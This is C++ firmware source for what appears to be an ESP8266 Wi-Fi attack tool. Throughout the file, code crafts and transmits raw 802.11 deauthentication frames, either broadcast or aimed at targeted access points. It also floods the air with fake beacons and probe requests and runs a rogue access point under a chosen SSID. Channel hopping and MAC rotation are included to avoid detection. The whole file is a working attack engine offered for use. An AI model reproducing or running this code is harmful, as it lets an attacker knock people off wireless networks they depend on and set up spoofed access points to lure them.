#include "attack_engine.h"
extern "C" {
    #include "user_interface.h"
    #include "wl_definitions.h"
}

AttackEngine::AttackEngine(ConfigManager& configMgr) 
    : config(configMgr), active(false), paused(false), scanning(false),
      targetCount(0), maxTargets(20), packetCallback(nullptr), statusCallback(nullptr) {
    
    targets = new WiFiNetwork[maxTargets];
    memset(&stats, 0, sizeof(AttackStats)); // ✅ AttackStats dari defines.h
}

AttackEngine::~AttackEngine() {
    stop();
    cleanup();
    if (targets) delete[] targets;
}

bool AttackEngine::begin() {
    Serial.println("[ATTACK] Initializing engine...");
    
    if (!initHardware()) {
        Serial.println("[ATTACK] Hardware init failed!");
        return false;
    }
    
    if (!initTimers()) {
        Serial.println("[ATTACK] Timer init failed!");
        return false;
    }
    
    // Set initial MAC
    generateRandomMAC(currentMAC);
    setMACInternal(currentMAC);
    
    // Set initial channel
    currentChannel = config.get().targetChannel;
    setChannelInternal(currentChannel);
    
    // Reset stats
    resetStatistics();
    
    Serial.println("[ATTACK] Engine initialized successfully");
    return true;
}

bool AttackEngine::start() {
    if (active) {
        Serial.println("[ATTACK] Already active");
        return false;
    }
    
    Config& cfg = config.get();
    
    // Validate configuration
    if (cfg.deauthRate < MIN_DEAUTH_RATE || cfg.deauthRate > MAX_DEAUTH_RATE) {
        Serial.println("[ATTACK] Invalid deauth rate");
        return false;
    }
    
    if (cfg.beaconRate < MIN_BEACON_RATE || cfg.beaconRate > MAX_BEACON_RATE) {
        Serial.println("[ATTACK] Invalid beacon rate");
        return false;
    }
    
    // Start timers
    float interval = 1000.0 / cfg.deauthRate;
    attackTicker.attach_ms(interval, [this]() { this->update(); });
    
    // Start stealth timers if enabled
    if (cfg.channelHop) {
        hopTicker.attach_ms(cfg.hopInterval, [this]() { this->hopChannel(); });
    }
    
    if (cfg.randomMac) {
        macTicker.attach_ms(cfg.macChangeInterval, [this]() { this->rotateMAC(); });
    }
    
    // Update state
    active = true;
    paused = false;
    attackStartTime = millis();
    stats.start_time = attackStartTime;
    stats.is_active = true;
    
    // Call callback
    if (statusCallback) statusCallback(true);
    
    Serial.println("[ATTACK] Attack started");
    return true;
}

bool AttackEngine::stop() {
    if (!active) {
        Serial.println("[ATTACK] Not active");
        return false;
    }
    
    // Stop all timers
    attackTicker.detach();
    hopTicker.detach();
    macTicker.detach();
    
    // Update state
    active = false;
    paused = false;
    stats.is_active = false;
    
    // Update config
    Config& cfg = config.get();
    cfg.attackTime += (millis() - attackStartTime) / 1000;
    config.save();
    
    // Call callback
    if (statusCallback) statusCallback(false);
    
    Serial.println("[ATTACK] Attack stopped");
    return true;
}

bool AttackEngine::pause() {
    if (!active || paused) return false;
    
    paused = true;
    stats.is_paused = true;
    Serial.println("[ATTACK] Attack paused");
    return true;
}

bool AttackEngine::resume() {
    if (!active || !paused) return false;
    
    paused = false;
    stats.is_paused = false;
    Serial.println("[ATTACK] Attack resumed");
    return true;
}

void AttackEngine::update() {
    if (!active || paused) return;
    
    Config& cfg = config.get();
    
    // Send packets based on mode
    switch (cfg.attackMode) {
        case MODE_DEAUTH:
            sendDeauth();
            break;
        case MODE_BEACON_SPAM:
            sendBeacon();
            break;
        case MODE_PROBE_FLOOD:
            sendProbe();
            break;
        case MODE_MIXED:
            sendDeauth();
            if (cfg.beaconSpam) sendBeacon();
            if (cfg.probeFlood) sendProbe();
            break;
        case MODE_ROGUE_AP:
            sendRogueBeacon();
            break;
    }
    
    // Update statistics
    updateStatistics();
}

void AttackEngine::sendDeauth() {
    Config& cfg = config.get();
    
    setupPromiscuous();
    
    uint8_t packet[DEAUTH_PACKET_SIZE];
    uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    if (cfg.attackAll) {
        // Broadcast deauth
        generateDeauthPacket(packet, broadcast, currentMAC, broadcast);
        
        for (int i = 0; i < cfg.deauthRate / 20; i++) {
            wifi_send_pkt_freedom(packet, DEAUTH_PACKET_SIZE, 0);
            stats.deauth_packets++;
            stats.total_packets++;
            
            if (packetCallback) packetCallback(stats.total_packets);
        }
    } else {
        // Targeted deauth for each target
        for (uint8_t t = 0; t < targetCount; t++) {
            generateDeauthPacket(packet, targets[t].bssid, currentMAC, targets[t].bssid);
            
            for (int i = 0; i < cfg.deauthRate / (targetCount * 10); i++) {
                wifi_send_pkt_freedom(packet, DEAUTH_PACKET_SIZE, 0);
                stats.deauth_packets++;
                stats.total_packets++;
                
                if (packetCallback) packetCallback(stats.total_packets);
            }
        }
    }
}

void AttackEngine::sendBeacon() {
    Config& cfg = config.get();
    
    if (!cfg.beaconSpam) return;
    
    setupPromiscuous();
    
    uint8_t packet[BEACON_PACKET_SIZE];
    char ssid[32];
    
    for (int i = 0; i < cfg.beaconRate; i++) {
        generateRandomSSID(ssid, 32);
        generateBeaconPacket(packet, ssid, currentChannel, currentMAC);
        
        wifi_send_pkt_freedom(packet, 50 + strlen(ssid), 0);
        stats.beacon_packets++;
        stats.total_packets++;
        
        delay(5);
    }
}

void AttackEngine::sendProbe() {
    Config& cfg = config.get();
    
    if (!cfg.probeFlood) return;
    
    setupPromiscuous();
    
    uint8_t packet[PROBE_PACKET_SIZE];
    char ssid[32];
    uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (int i = 0; i < cfg.probeRate; i++) {
        generateRandomSSID(ssid, 32);
        generateProbePacket(packet, ssid, currentMAC);
        
        // Modify for broadcast
        memcpy(&packet[4], broadcast, 6);
        memcpy(&packet[16], broadcast, 6);
        
        wifi_send_pkt_freedom(packet, 25 + strlen(ssid), 0);
        stats.probe_packets++;
        stats.total_packets++;
        
        delay(3);
    }
}

void AttackEngine::sendRogueBeacon() {
    Config& cfg = config.get();
    
    if (!cfg.rogueAP) return;
    
    setupPromiscuous();
    
    uint8_t packet[BEACON_PACKET_SIZE];
    generateBeaconPacket(packet, cfg.rogueSSID, currentChannel, currentMAC);
    
    wifi_send_pkt_freedom(packet, 50 + strlen(cfg.rogueSSID), 0);
    stats.beacon_packets++;
    stats.total_packets++;
}

void AttackEngine::hopChannel() {
    Config& cfg = config.get();
    
    if (!cfg.channelHop) return;
    
    currentChannel = getRandomChannel();
    setChannelInternal(currentChannel);
    
    Serial.printf("[ATTACK] Hopped to channel %d\n", currentChannel);
}

void AttackEngine::rotateMAC() {
    Config& cfg = config.get();
    
    if (!cfg.randomMac) return;
    
    generateRandomMAC(currentMAC);
    setMACInternal(currentMAC);
    
    Serial.printf("[ATTACK] MAC rotated to %02X:%02X:%02X:%02X:%02X:%02X\n",
                  currentMAC[0], currentMAC[1], currentMAC[2],
                  currentMAC[3], currentMAC[4], currentMAC[5]);
}

bool AttackEngine::setTarget(const uint8_t* bssid, uint8_t channel) {
    if (targetCount >= maxTargets) {
        Serial.println("[ATTACK] Target list full");
        return false;
    }
    
    WiFiNetwork target;
    memcpy(target.bssid, bssid, 6);
    target.channel = channel;
    target.selected = true;
    target.lastSeen = millis();
    
    targets[targetCount++] = target;
    
    Serial.printf("[ATTACK] Target added: %02X:%02X:%02X:%02X:%02X:%02X (Ch:%d)\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    
    return true;
}

bool AttackEngine::addTarget(const WiFiNetwork& network) {
    return setTarget(network.bssid, network.channel);
}

AttackStats AttackEngine::getStats() const {
    AttackStats currentStats = stats;
    
    if (active) {
        currentStats.duration_ms = millis() - attackStartTime;
        currentStats.target_count = targetCount;
        currentStats.current_channel = currentChannel;
        
        if (currentStats.duration_ms > 0) {
            currentStats.packets_per_second = 
                (float)currentStats.total_packets / (currentStats.duration_ms / 1000.0);
        }
    }
    
    return currentStats;
}

void AttackEngine::updateStatistics() {
    stats.total_packets = stats.deauth_packets + stats.beacon_packets + stats.probe_packets;
    
    // Update config packet count
    config.incrementPacketCount();
}

void AttackEngine::resetStatistics() {
    memset(&stats, 0, sizeof(AttackStats));
    stats.is_active = false;
    stats.is_paused = false;
}

bool AttackEngine::initHardware() {
    // Set WiFi mode
    wifi_set_opmode(STATION_MODE);
    
    // Disconnect from any AP
    WiFi.disconnect();
    
    // Set promiscuous mode
    setupPromiscuous();
    
    // Set TX power
    Config& cfg = config.get();
    WiFi.setOutputPower(cfg.txPower * 2.0f); // Convert to dBm
    
    Serial.println("[ATTACK] Hardware initialized");
    return true;
}

bool AttackEngine::initTimers() {
    // Stats update timer
    statsTicker.attach(1.0, [this]() {
        this->updateStatistics();
    });
    
    // Network scan timer
    scanTicker.attach(30.0, [this]() {
        this->scanNetworks();
    });
    
    return true;
}

void AttackEngine::setupPromiscuous() {
    static bool promiscuousSet = false;
    
    if (!promiscuousSet) {
        wifi_promiscuous_enable(1);
        promiscuousSet = true;
    }
}

void AttackEngine::setChannelInternal(uint8_t channel) {
    wifi_set_channel(channel);
    currentChannel = channel;
}

void AttackEngine::setMACInternal(const uint8_t* mac) {
    wifi_set_macaddr(STATION_IF, const_cast<uint8_t*>(mac));
}

void AttackEngine::generateRandomSSID(char* buffer, size_t length) {
    const char* prefixes[] = {"Free", "Public", "Guest", "WiFi", "Hotspot",
                             "Secure", "Open", "Mobile", "Airport", "Hotel"};
    const char* suffixes[] = {"Net", "Access", "Zone", "Point", "Link",
                            "Connect", "Hub", "Node", "Spot", "Gate"};
    
    int preIdx = random(0, 10);
    int sufIdx = random(0, 10);
    int num = random(100, 1000);
    
    snprintf(buffer, length, "%s_%s_%d", prefixes[preIdx], suffixes[sufIdx], num);
}

void AttackEngine::generateRandomMAC(uint8_t* mac) {
    mac[0] = 0x02; // Locally administered
    for (int i = 1; i < 6; i++) {
        mac[i] = random(256);
    }
}

uint8_t AttackEngine::getRandomChannel() {
    return random(MIN_CHANNEL, MAX_CHANNEL + 1);
}

void AttackEngine::generateDeauthPacket(uint8_t* packet, const uint8_t* dest,
                                       const uint8_t* src, const uint8_t* bssid) {
    // Type: Management, Subtype: Deauth (0xC0)
    packet[0] = 0xC0;
    packet[1] = 0x00;
    
    // Duration
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Destination
    memcpy(&packet[4], dest, 6);
    
    // Source
    memcpy(&packet[10], src, 6);
    
    // BSSID
    memcpy(&packet[16], bssid, 6);
    
    // Fragment & Sequence number
    packet[22] = 0x00;
    packet[23] = 0x00;
    
    // Reason code
    packet[24] = REASON_CODE_DEAUTH;
    packet[25] = 0x00;
}

void AttackEngine::generateBeaconPacket(uint8_t* packet, const char* ssid,
                                       uint8_t channel, const uint8_t* bssid) {
    // Beacon frame template
    uint8_t template[] = {
        0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x31, 0x04, 0x00, 0x00, 0x01, 0x08, 0x82, 0x84,
        0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C, 0x03, 0x01
    };
    
    memcpy(packet, template, sizeof(template));
    
    // Set BSSID
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    
    // Set channel
    packet[sizeof(template) - 1] = channel;
    
    // Add SSID
    size_t ssidLen = strlen(ssid);
    size_t pos = sizeof(template);
    
    // SSID tag
    packet[pos++] = 0x00;
    packet[pos++] = ssidLen;
    memcpy(&packet[pos], ssid, ssidLen);
    pos += ssidLen;
}

void AttackEngine::generateProbePacket(uint8_t* packet, const char* ssid,
                                      const uint8_t* src) {
    // Probe request template
    packet[0] = 0x40; // Type: Management, Subtype: Probe Request
    packet[1] = 0x00;
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Destination (will be set later)
    memset(&packet[4], 0xFF, 6);
    
    // Source
    memcpy(&packet[10], src, 6);
    
    // BSSID (will be set later)
    memset(&packet[16], 0xFF, 6);
    
    // Fragment/sequence
    packet[22] = 0x00;
    packet[23] = 0x00;
    
    // SSID length and data
    size_t ssidLen = strlen(ssid);
    packet[24] = ssidLen;
    memcpy(&packet[25], ssid, ssidLen);
}

void AttackEngine::cleanup() {
    attackTicker.detach();
    hopTicker.detach();
    macTicker.detach();
    statsTicker.detach();
    scanTicker.detach();
    
    wifi_promiscuous_enable(0);
}

void AttackEngine::scanNetworks() {
    if (scanning) return;
    
    scanning = true;
    Serial.println("[ATTACK] Scanning networks...");
    scanning = false;
}

void AttackEngine::printDebugInfo() {
    Serial.println("\n=== ATTACK ENGINE DEBUG ===");
    Serial.printf("Active: %s\n", active ? "YES" : "NO");
    Serial.printf("Paused: %s\n", paused ? "YES" : "NO");
    Serial.printf("Channel: %d\n", currentChannel);
    Serial.printf("Targets: %d/%d\n", targetCount, maxTargets);
    Serial.printf("Packets: %u (D:%u, B:%u, P:%u)\n",
                  stats.total_packets, stats.deauth_packets,
                  stats.beacon_packets, stats.probe_packets);
    Serial.printf("PPS: %.1f\n", stats.packets_per_second);
    Serial.println("==========================\n");
}